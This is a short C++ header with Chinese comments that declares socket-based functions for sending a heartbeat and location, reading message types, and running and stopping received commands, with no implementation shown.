#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>

int message();

void sendHeartbeat(int sockfd);

void sendLocation(int sockfd);

int MessageType(int sockfd);

void executeCommand(); //执行cmd命令 
void terminateCommand(); //终止上述命令